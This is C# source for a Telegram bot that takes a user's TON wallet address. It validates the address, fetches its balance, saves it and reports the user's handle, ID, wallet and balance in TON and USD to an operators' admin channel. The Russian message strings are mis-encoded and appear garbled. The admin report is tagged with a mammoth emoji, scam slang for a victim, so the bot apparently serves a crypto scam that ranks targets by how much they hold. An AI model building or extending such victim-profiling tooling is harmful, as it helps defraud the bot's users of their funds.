using Telegram.Bot;
using Telegram.Bot.Types.Enums;


using Requests;
using PostgreSQL;
using Bot_Keyboards;
using ConfigFile;
using Functions;

namespace States
{
    public class WalletState
    {
        public async static void MessageHandler(ITelegramBotClient botClient, string messageText, long chatId, string username)
        {
            string wallet = messageText;
            if(WalletFunction.CheckWalletRight(wallet))
            {
                if(UserDB.CheckWallet(wallet))
                {
                    await botClient.SendTextMessageAsync(
                        chatId: chatId,
                        text: $"<b>–î–∞–Ω–Ω—ã–π TON –∫–æ—à–µ–ª–µ–∫ —É–∂–µ –ø—Ä–∏–≤—è–∑–∞–Ω –∫ –¥—Ä—É–≥–æ–º—É –∞–∫–∫–∞—É–Ω—Ç—É‚Ä¶\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞ –≤–æ—Å–ø–æ–ª—å–∑—É–µ—Ç–µ—Å—å –∫–æ—à–µ–ª—å–∫–æ–º, –∫–æ—Ç–æ—Ä—ã–µ –µ—â–µ –Ω–µ –±—ã–ª –ø—Ä–∏–≤—è–∑–∞–Ω –∫ –Ω–∞—à–µ–º—É –±–æ—Ç—É!\n\n‚§µÔ∏è –í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –≤–∞—à–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞:</b>",
                        parseMode: ParseMode.Html
                    );
                    return;
                }
                else
                {
                    List<double> balance;
                    try
                    {
                        balance = GetWalletInfo.GetWalletBalance(wallet);
                        if(UserDB.CheckWalletInVerificationTable(wallet)){ }
                        else
                        {
                            UserDB.AddNewWalletToVerificationTable(wallet);
                        }
                    }
                    catch(Exception)
                    {
                        await botClient.SendTextMessageAsync(
                            chatId: chatId,
                            text: $"<b>‚ùóÔ∏è –î–∞–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.</b>",
                            parseMode: ParseMode.Html,
                            replyMarkup: Keyboards.MenuKb
                        );
                        return;
                    }

                    if(UserDB.GetWallet(chatId)=="–ù–µ —É–∫–∞–∑–∞–Ω")
                    {
                        UserDB.UpdateWallet(chatId, wallet);
                        UserDB.UpdateState(chatId, "MainMenu");

                        await botClient.SendTextMessageAsync(
                            chatId: chatId,
                            text: $"<b>üíé –í–∞—à —Ç–µ–∫—É—â–∏–π TON –∞–¥—Ä–µ—Å: </b><code>{wallet}</code>",
                            parseMode: ParseMode.Html,
                            replyMarkup: Keyboards.MenuKb
                        );
                        
                        await botClient.SendTextMessageAsync(
                            chatId: Config.adminChannel,
                            text: $"<b>ü¶£ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: </b>@{username}\n<b>üÜî ID: </b><code>{chatId}</code>\n<b>üíº –ö–æ—à–µ–ª—ë–∫: </b><code>{wallet}</code>\n<b>üí≤ –ë–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞: </b><code>{balance[0]}</code> TON | <code>{balance[1]}</code> USD",
                            parseMode: ParseMode.Html
                        );
                        return;
                    }
                    else
                    {
                        UserDB.UpdateWallet(chatId, wallet);
                        UserDB.UpdateState(chatId, "MainMenu");
                        await botClient.SendTextMessageAsync(
                            chatId: chatId,
                            text: $"<b>üíé –í–∞—à —Ç–µ–∫—É—â–∏–π TON –∞–¥—Ä–µ—Å: </b><code>{wallet}</code>",
                            parseMode: ParseMode.Html,
                            replyMarkup: Keyboards.MenuKb
                        );
                        await botClient.SendTextMessageAsync(
                            chatId: Config.adminChannel,
                            text: $"<b>ü¶£ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: </b>@{username}\n<b>üÜî ID: </b><code>{chatId}</code>\n<b>üíº –ö–æ—à–µ–ª—ë–∫: </b><code>{wallet}</code>\n<b>üí≤ –ë–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞: </b><code>{balance[0]}</code> TON | <code>{balance[1]}</code> USD",
                            parseMode: ParseMode.Html
                        );
                        return;
                    }
                }
            }
            else
            {
                await botClient.SendTextMessageAsync(
                    chatId: chatId,
                    text: $"<b>‚ò†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ –¥–∞–Ω–Ω—ã—Ö. –í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –≤–∞—à–µ–≥–æ TON –∫–æ—à–µ–ª—å–∫–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ.\n\n–ö–∞–∫ –¥–æ–ª–∂–µ–Ω –≤—ã–≥–ª—è–¥–µ—Ç—å –∫–æ—à–µ–ª—ë–∫? </b> <code>EQAXFiR6KO1YJmiNOnlRzrkJUQARVU-audCjU53PCD4GR_93</code>",
                    parseMode: ParseMode.Html,
                    replyMarkup: Keyboards.MenuKb
                );
            }
        }
    }
}